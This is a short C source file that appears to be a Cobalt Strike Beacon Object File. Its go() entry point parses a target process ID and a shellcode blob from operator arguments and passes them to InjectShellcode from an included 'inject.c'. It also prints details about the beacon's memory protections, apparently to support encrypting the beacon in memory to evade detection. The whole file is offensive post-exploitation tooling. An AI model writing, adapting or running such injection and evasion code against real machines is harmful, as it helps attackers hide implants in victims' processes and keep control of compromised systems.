#ifndef _WIN64
#error This code must be compiled with a 64-bit version of MSVC
#endif

#include <windows.h>
#include <tlhelp32.h>
#include "encrypt.h"
#include "inject.c"

#define SLEEP(x) KERNEL32$Sleep(x * 1000);

void PrintMemoryInfo()
{
    formatp buffer;
    BeaconFormatAlloc(&buffer, 1024);
    BeaconFormatPrintf(&buffer, "Beacon memory information:\n");
    BeaconFormatPrintf(&buffer, "Allocation Base: %p\n", bencrypt.mbi.AllocationBase);
    BeaconFormatPrintf(&buffer, "Region Base: %p\n", bencrypt.mbi.BaseAddress);
    BeaconFormatPrintf(&buffer, "Region Size: %d\n", bencrypt.mbi.RegionSize);
    BeaconFormatPrintf(&buffer, "Original Protection: %x\n", bencrypt.mbi.AllocationProtect);
    BeaconFormatPrintf(&buffer, "Current Protection: %x\n", bencrypt.mbi.Protect);

    BeaconPrintf(CALLBACK_OUTPUT, "%s\n", BeaconFormatToString(&buffer, NULL));
    BeaconFormatFree(&buffer);
}

void go(char *args, int len)
{

    char *sc_ptr;
    SIZE_T sc_len;
    DWORD pid;
    datap parser;

    BeaconDataParse(&parser, args, len);
    pid = BeaconDataInt(&parser);

    sc_len = BeaconDataLength(&parser);
    sc_ptr = BeaconDataExtract(&parser, NULL);

    if (!init())
        return;

    BeaconPrintf(CALLBACK_OUTPUT, "Init Success");
    PrintMemoryInfo();

    InjectShellcode(pid, sc_ptr, sc_len);

}
